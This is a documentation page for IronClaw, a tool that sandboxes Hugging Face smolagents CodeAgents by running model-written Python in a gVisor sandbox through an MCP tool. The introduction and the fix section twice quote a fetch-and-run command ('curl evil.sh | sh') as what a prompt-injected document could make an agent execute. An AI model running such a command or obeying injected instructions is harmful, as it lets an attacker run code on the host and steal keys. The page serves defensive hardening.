---
title: "Sandbox your Hugging Face smolagents agent with IronClaw"
description: How to sandbox a Hugging Face smolagents CodeAgent. smolagents writes and runs Python; route that execution through IronClaw's MCP server so model-written code runs inside a sealed gVisor sandbox instead of your host, key held host-side and every call gated, plus a credential-free demo you can run first.
---

# Sandbox your smolagents agent with IronClaw

You built an agent with **[smolagents](https://github.com/huggingface/smolagents)**:
a model and a `CodeAgent` that solves tasks by **writing and running Python**. That
is the point of smolagents, and it is exactly what makes it dangerous to run
somewhere real. By default a `CodeAgent` executes the model's Python **in your own
process**, with your environment, your filesystem, and unrestricted outbound network.
One prompt-injected instruction inside a document the agent reads and that same
process runs `import os; os.system("curl evil.sh | sh")`.

smolagents ships remote executors (E2B, Docker) for exactly this reason. IronClaw is
the **security-hardened** option: the model-written code runs behind a sealed sandbox
under **gVisor (runsc)** with no network card, the model key held **host-side** and
never in the agent, and every privileged action gated and audited.

!!! example "Runnable example"
    A one-command smolagents to IronClaw example lives at
    [`examples/integrations/smolagents`](https://github.com/IronSecCo/ironclaw/tree/main/examples/integrations/smolagents):
    a `CodeAgent` whose code execution is backed by an IronClaw sandbox, with a
    blocked escape attempt printed at the end. The credential-free demo below runs
    the same sealed loop today.

## The fix: run the model's code in IronClaw, not your host

IronClaw ships an MCP server that exposes a single, blunt tool, **`sandbox_exec`**,
which runs any command or snippet inside an ephemeral, hardened box under **gVisor
(runsc)**: no network card, every Linux capability dropped, a non-root user, a
read-only root filesystem, and a restrictive seccomp profile. smolagents loads MCP
tools with `ToolCollection.from_mcp`:

```python
from mcp import StdioServerParameters
from smolagents import ToolCollection, CodeAgent, InferenceClientModel

server = StdioServerParameters(command="ironctl", args=["mcp", "serve"])

with ToolCollection.from_mcp(server, trust_remote_code=True) as tc:
    agent = CodeAgent(tools=[*tc.tools], model=InferenceClientModel())
    agent.run("Analyze this log file and summarize the errors.")
```

The agent still writes the code. It just can no longer run it on your box: every
command lands inside the sealed sandbox, so a poisoned document that says
`curl evil.sh | sh` executes with no network card and nothing to steal.

!!! warning "gVisor (runsc) is the boundary"
    `ironctl mcp serve` passes `--runtime runsc` by default and **fails closed** if
    runsc is not installed rather than silently downgrading. Install gVisor from
    [gvisor.dev](https://gvisor.dev/docs/user_guide/install/). See
    [Run IronClaw as an MCP server](mcp-server.md) for HTTP transport and auth.

## Why sandbox this

A typical smolagents `CodeAgent`:

```python
from smolagents import CodeAgent, InferenceClientModel

agent = CodeAgent(tools=[], model=InferenceClientModel())
agent.run("summarize today's incidents")   # runs model-written Python on YOUR host
```

Three things are true of that snippet, and all three are risks:

1. **The key is in the process.** Anything that reads `os.environ` reads it.
2. **The code runs with your privileges.** Model-written Python executes on your box,
   with your filesystem and network.
3. **Egress is wide open.** The process can reach any host on the internet.

Routing execution through `sandbox_exec` closes all three by construction, not by
convention.

## See it work first (no credentials)

Before wiring anything, watch the sealed loop run with the offline `mock` provider.
No model key, no tokens, just Docker:

```sh
git clone https://github.com/IronSecCo/ironclaw.git && cd ironclaw
docker compose -f docker-compose.demo.yml up --build -d      # start the demo control-plane

curl -s -X POST http://127.0.0.1:8787/v1/ui/chat/send \
  -H 'authorization: Bearer ironclaw-demo' -H 'content-type: application/json' \
  -d '{"agentGroupID":"mock-agent","text":"hello from smolagents"}'
```

You get a sealed agent loop with a human-approval gateway and an append-only audit
log, before you point a single real key at it.

## Next steps

- [Run IronClaw as an MCP server](mcp-server.md) - full transport, auth, and
  containment-status detail for any MCP client.
- [Sandbox your Google ADK agent](google-adk.md) - the same MCP wiring for the
  Google Agent Development Kit.
- [Isolation, proven](../security-isolation.md) - how the sandbox holds under a real
  escape attempt.
